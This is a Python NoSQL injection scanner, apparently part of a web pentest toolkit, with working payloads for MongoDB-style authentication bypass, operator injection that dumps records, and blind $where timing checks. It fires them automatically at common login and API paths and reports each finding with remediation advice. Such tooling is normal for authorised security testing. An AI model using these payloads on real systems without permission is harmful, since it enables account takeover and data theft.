#!/usr/bin/env python3
"""
NoSQL Injection Scanner
------------------------
Tests MongoDB, CouchDB, Firebase and other NoSQL databases for:
  • Operator injection ($gt, $ne, $regex, $where)
  • JSON body injection
  • Array injection
  • Authentication bypass via NoSQL operators
  • Blind NoSQL injection (time-based via $where)
"""

import json, time, requests, concurrent.futures
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# Auth bypass payloads (JSON)
NOSQL_AUTH_JSON = [
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": "admin", "password": {"$ne": "invalid"}},
    {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}},
]

# QS-based NoSQL operator payloads
NOSQL_QS_PAYLOADS = [
    ("username[$gt]", ""),
    ("username[$ne]", "invalid"),
    ("username[$regex]", ".*"),
    ("password[$gt]", ""),
    ("password[$ne]", "invalid"),
    ("id[$gt]", "0"),
    ("id[$ne]", "-1"),
]

# Blind injection via $where (JavaScript execution)
NOSQL_WHERE_PAYLOADS = [
    '{"$where": "sleep(3000)"}',
    '{"$where": "function(){var d=new Date();while((new Date()-d)<3000){}return true;}"}',
]

AUTH_PATHS = [
    "/login",
    "/signin",
    "/api/login",
    "/api/auth",
    "/auth/login",
    "/api/signin",
    "/user/login",
    "/admin/login",
]

SUCCESS_INDICATORS = [
    "token",
    "session",
    "dashboard",
    "welcome",
    "logout",
    "access_token",
    "jwt",
    "authenticated",
    "success",
]

FAILURE_INDICATORS = [
    "invalid",
    "incorrect",
    "wrong",
    "error",
    "denied",
    "failed",
    "unauthorized",
]


class NoSQLScanner:
    def __init__(self, target: str, session=None, timeout: int = 10, threads: int = 5):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault("User-Agent", "WebPwnToolkit/2.2")
        self.results: List[Dict] = []

    def _post_json(self, url: str, data: dict) -> Optional[requests.Response]:
        try:
            return self.session.post(
                url,
                json=data,
                headers={"Content-Type": "application/json"},
                timeout=self.timeout,
                verify=False,
            )
        except Exception:
            return None

    def _post_form(self, url: str, data: dict) -> Optional[requests.Response]:
        try:
            return self.session.post(url, data=data, timeout=self.timeout, verify=False)
        except Exception:
            return None

    def _get(self, url: str, params: dict = None) -> Optional[requests.Response]:
        try:
            return self.session.get(
                url, params=params, timeout=self.timeout, verify=False
            )
        except Exception:
            return None

    def _is_success(self, resp: requests.Response) -> bool:
        if not resp:
            return False
        if resp.status_code in (301, 302):
            loc = resp.headers.get("Location", "")
            return any(ind in loc.lower() for ind in ["dashboard", "home", "profile"])
        if resp.status_code != 200:
            return False
        body = resp.text.lower()
        has_success = any(ind in body for ind in SUCCESS_INDICATORS)
        has_failure = any(ind in body for ind in FAILURE_INDICATORS)
        return has_success and not has_failure

    # ── Auth bypass via JSON ─────────────────────────────────────────────

    def _test_auth_bypass(self) -> List[Dict]:
        findings = []
        for path in AUTH_PATHS:
            url = self.target + path
            # Check if endpoint exists
            r = self._get(url)
            if not r or r.status_code == 404:
                continue

            for payload in NOSQL_AUTH_JSON:
                resp = self._post_json(url, payload)
                if self._is_success(resp):
                    findings.append(
                        {
                            "url": url,
                            "type": "NoSQL Injection — Authentication Bypass",
                            "severity": "critical",
                            "cvss": 9.8,
                            "payload": json.dumps(payload),
                            "detail": (
                                f"NoSQL operator injection at '{path}' bypassed authentication. "
                                f"Attacker can log in as any user without valid credentials."
                            ),
                            "evidence": f"Payload: {json.dumps(payload)} → HTTP {resp.status_code}",
                            "owasp": "A03:2021 – Injection",
                            "remediation": (
                                "Sanitize all inputs before passing to MongoDB queries. "
                                "Use mongoose schema validation. Reject keys starting with '$'. "
                                "Prefer typed ODM validation over raw queries."
                            ),
                        }
                    )
                    break  # One finding per endpoint

        return findings

    # ── QS-based operator injection ──────────────────────────────────────

    def _test_qs_operators(self) -> List[Dict]:
        findings = []
        api_paths = [
            "/api/users",
            "/api/user",
            "/api/products",
            "/api/items",
            "/api/search",
            "/search",
            "/api/find",
        ]
        for path in api_paths:
            url = self.target + path
            for param, value in NOSQL_QS_PAYLOADS:
                resp = self._get(url, params={param: value})
                if not resp or resp.status_code == 404:
                    continue
                body = resp.text
                if resp.status_code == 200 and len(body) > 50:
                    # Check if array/list returned (data leak)
                    try:
                        data = resp.json()
                        if isinstance(data, list) and len(data) > 0:
                            findings.append(
                                {
                                    "url": url,
                                    "type": "NoSQL Injection — Operator Injection (Data Leak)",
                                    "severity": "high",
                                    "cvss": 8.6,
                                    "parameter": param,
                                    "payload": f"{param}={value}",
                                    "detail": (
                                        f"MongoDB operator '{param}={value}' returned {len(data)} records. "
                                        f"Attacker can enumerate all documents."
                                    ),
                                    "evidence": f"Returned {len(data)} documents",
                                    "owasp": "A03:2021 – Injection",
                                    "remediation": (
                                        "Sanitize query parameters. Use allowlist for query operators. "
                                        "Implement pagination with authentication."
                                    ),
                                }
                            )
                            break
                    except Exception:
                        pass
        return findings

    # ── Blind NoSQL (time-based via $where) ──────────────────────────────

    def _test_blind_nosql(self) -> List[Dict]:
        findings = []
        for path in AUTH_PATHS[:3]:
            url = self.target + path
            for payload_str in NOSQL_WHERE_PAYLOADS:
                try:
                    payload = json.loads(payload_str)
                    t0 = time.time()
                    resp = self._post_json(url, payload)
                    elapsed = time.time() - t0
                    if elapsed >= 2.5:
                        findings.append(
                            {
                                "url": url,
                                "type": "NoSQL Injection — Blind Time-Based ($where)",
                                "severity": "critical",
                                "cvss": 9.0,
                                "payload": payload_str,
                                "detail": (
                                    f"MongoDB $where clause caused {elapsed:.1f}s delay — "
                                    f"JavaScript execution confirmed on server."
                                ),
                                "evidence": f"Response delay: {elapsed:.2f}s",
                                "owasp": "A03:2021 – Injection",
                                "remediation": (
                                    "Disable $where operator in production. "
                                    "Use MongoDB's query operators instead of JavaScript. "
                                    "Upgrade to latest MongoDB with JS disabled."
                                ),
                            }
                        )
                        break
                except Exception:
                    pass
        return findings

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ NoSQL Injection Scanner on {self.target}[/bold yellow]"
        )
        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]NoSQL scanning...[/cyan]"),
            BarColumn(),
            console=console,
        ) as prog:
            task = prog.add_task("nosql", total=3)
            prog.advance(task)
            self.results.extend(self._test_auth_bypass())
            prog.advance(task)
            self.results.extend(self._test_qs_operators())
            prog.advance(task)
            self.results.extend(self._test_blind_nosql())

        color = "red" if self.results else "green"
        console.print(
            f"  [{color}]{len(self.results)} NoSQL injection issue(s) found[/]"
        )
        return self.results
